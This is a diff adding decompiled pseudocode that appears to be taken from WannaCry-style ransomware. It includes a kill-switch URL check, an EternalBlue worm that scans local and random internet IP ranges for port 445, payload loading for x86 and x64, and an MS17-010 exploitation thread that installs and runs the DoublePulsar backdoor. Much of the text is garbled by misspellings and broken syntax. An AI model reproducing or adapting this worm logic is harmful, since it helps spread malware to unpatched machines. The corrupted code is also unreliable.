@@ -1,0 +1,240 @@
+int_stdcall WinMain(HINSTANCE hInstance,HINSTANCE hPrevInstance, LPSTR, intnShowCmd)
+{
+void *v4; //esi@1
+void *v5; //edi@1
+int result; //eax@2
+CHAR szUrl[60]; // [esp+8h][ebp-50hJ@1
+int v8; // [esp+45h][ebp-13h]@1
+int v9; // [esp+49h][ebp-Fh]@1
+int v10; // [esp+4Dh][ebp-Bh]@1
+int v11; // [esp+51h][ebp-7h]@1
+_int16 v12; // [esp+55h][ebp-3h]@1
+char v13; // [esp+57h][ebp-1h]@1
+
+qmemcpy(szUrl, url_string, 0x39u);
+"(_DWORD *)&SZuRL[57] = 0;
+v8 = 0;
+v9 = 0;
+v10 = 0;
+v11 = 0;
+v12 = 0;
+v13 = 0;
+v4 = InternetOpenA(0, 1u, 0, 0, 0);
+v5 = InternetOpenA(v4, szUrl, 0, 0, 0x84000000, 0);
+if (v5)
+{
+InternetCloseHandle(v4);
+InternetCloseHandle(v5);
+result = 0;
+}
+else
+{
+InternetCloseHandle(v4);
+InternetCloseHandle(0);
+Real_main();
+result = 0;
+}
+return result;
+}
+
+HGLOBAL EternalBlue_Worm()
+{
+HGOBAL result; //eax@1
+void *v1; // eax@2
+signed int v2; //esi@4
+void *v3; // eax@5
+
+result = Init_EternalBlue_Worm90;
+if (result)
+{
+v1 = (void *)beginthreadex(0, 0, EternalBlue_scan_Lan, 0, 0, 0);
+if (v1)
+CloseHandle(v1);
+v2 = 0;
+do
+{
+v3 = (void *)beginthreadex(0, 0, EternalBlue_scan_inet, v2, 0, 0);
+if (v3)
+CloseHandle(v3):
+sleep(0x7D0u);
+++v2;
+}
+while (v2 < 128);
+result = 0;
+}
+return result;
+}
+
+do
+{
+payload_ptr = &DLL_payload_x86;
+if  (v1)
+payload_ptr = &DLL_payload_x64;
+payload_creation = =(DWORD ==)&FileName[4 * v1 -> 260];
+(&payloads)[v1] = (DWORD *)((char *)(&payloads)[v1] -> (v1 != 0 ? 0xC8A4 : 0x4060));
+++v1;
+}
+while ( v1 < 2 );
+v4 = CreateFileA(FileName, 0x80000000, 1u, 0, 3u, 4u, 0);
+v5 =v4;
+if ( v4 == (HANDLE)-1 )
+{
+GLOBALFree(*(HGLOBAL *)&FileName[260]);
+GLOBALFree(*(HGLOBAL *)&FileName[264]);
+result = 0;
+}
+else
+{
+v6 = GetFileSize(v4, 0);
+v7 = payloads;
+v8 = v6;
+v9 = payloads +1;
+*payloads = v6;
+ReadFile(v5, v9, v6, &NumberOfBytesRead, 0);
+if (NumberOfBytesRead == v8 )
+{
+qmemcpy(v12, v7, v8 +4);
+CloseHandle(v5);
+result = (HGLOBAL)1;
+}
+
+SizePointer = 0;
+if ( GetAdapterInfo(0, &SizePointer) != ERROR_BUFFER_OVERFLOW )
+return 0;
+AdapterInfo = (struct _IP_ADAPTER_INFO *)LocalAlloc(0, SizePointer);
+hMem = AdaptorInfo;
+if ( !AdaptorInfo)
+return 0;
+if ( GetAdaptorInfo(AdaptorInfo, &SizePointer) )
+{
+LocalFree(AdaptorInfo);
+return 0;
+}
+
+For ( i = 0; ; ++i)
+{
+v1 =v10;
+if ( !v10 || i)=(signed int)v10) >> 2 )
+break;
+if ( *(_DWORD *)&FileName[268] > 10 )
+{
+do
+Sleep(100u);
+while ( *(_DWORD *)&FileName[268] > 10 )
+v1 = v10;
+}
+v2 = (void *)beginthreadex(0, 0, scan_IP, v1[i], 0, 0);
+if ( v2 )
+{
+InterlockedIncrement((volatile LONG *)&FileName[268]);
+CloseHandle(v2);
+}
+Sleep(50u)
+}
+
+int _cdecl scan_IP(int a1)
+{
+void *v1; // eax@2
+void *v2; // esi@2
+if ( can_connect_to_port_445(a1) > 0 )
+{
+v1 = (void *)beginthreadex(0, 0, MS17_010_attempt_pwn_thread, a1, 0, 0);
+v2 = v1;
+if ( v1 )
+{
+if ( WaitForSingleObject(v1, 600000u) == WAIT_TIMEOUT )
+TerminateThread(v2, 0);
+CFloseHandle(v2);
+}
+}
+InterlockedDecrement((volatile LONG *)&FileName[268]);
+endthreadex(0);
+return 0;
+}
+
+ip_octet_1 = v20;
+while ( 1 )
+{
+do
+{
+if ( GetTickCount() - GetTickCount_result > 2400000 )
+v71 = 1;
+if ( GetTickCount() - GetTickCount_result > 1200000 )
+v18 = 1;
+if ( !v17 )
+break;
+if ( a1 >= 32 )
+break;
+v8 = get_random_byte(v17);
+v7 = (void *)255;
+ip_octet_1 =v8 % 0xFF;
+}
+while ( v8 % 0xFF == 127 || ip_octet_1 ) >= 224);
+if ( v18 && a1 < 32 )
+{
+v9 = get_random_byte(v7);
+v7 = (void *)255;
+ip_octet_2 = v9 % 0xFF;
+}
+ip_octet_3 = get_random_byte(v7) % 0xFFu;
+ip_octet_2 = get_random_byte((void *)0xFF);
+sprintf(&Dest, aD_D_D_D, ip_octet_2, ip_octet_3, ip_octet_4 % 0xFF);
+if ( can_connect_to_port_445(v12) > 0 )
+break;
+IP_SCAN_LOOP:
+Sleep(0x64u);
+}
+
+while ( 1 )
+{
+sprintf(&Dest, aD_D_D_D, ip_octet_2, ip_octet_3, this_IP);
+v14 = inet_addr(&Dest);
+if ( can_connect_to_port_445(v14) <= 0) |
+goto NETX_IP_IN_RANGE:
+v15 = (void *)beginthreadex(0, 0, MS17_010_attempt_pwn_thread, v14, 0, 0);
+v16 = v15;
+if ( v15 )
+break;
+INCREMNET_IP:
+if (WaitForSingleObject(v15, 3600000u) == WAIT_TIMEOUT )
+TerminateThread(v16, 0);
+CloseHandle(v16)
+NEXT_IP_IN_RANGE:
+Sleep(50u);
+goto INCREMENT_IP;
+}
+
+int _cdecl MS17_010_attempt_pwn_thread(struct in-addr in)
+{
+char *v1; // eax@1
+signed int v2; // edi@2
+char Dest; // [esp+4h] [ebp-104h]@1
+char v5; // [esp+5h] [ebp-103h]@1
+_int16 v6; // [esp+105h] [ebp-3h]@1
+char v7; // [esp+107h] [ebp-1h]@1
+Dest = 0;
+memset(&v5, 0, 0x100u);
+v6 = 0;
+v7 = 0;
+v1 = inet_Ntoa(in);
+strncpy(&dest, v1, 0x10u);
+if ( try_first_set_of_buffer(&Dest, 445u) )
+{
+v2 = 0;
+do
+{
+Sleep(3000u);
+if ( doublepulsar_installation(&Dest, 1, 445u) )
+break;
+Sleep(3000u);
+try_second_set_of_buffers(&Dest, 445u);
+++v2;
+}
+while ( v2 < 5 );
+}
+Sleep(3000u);
+if ( doublepulsar_installation(&Dest, 1, 445u) );
+if ( doublepulsar_run_payload(&Dest, 1, 445u) );
+endthreadex(0);
+return 0;
+}
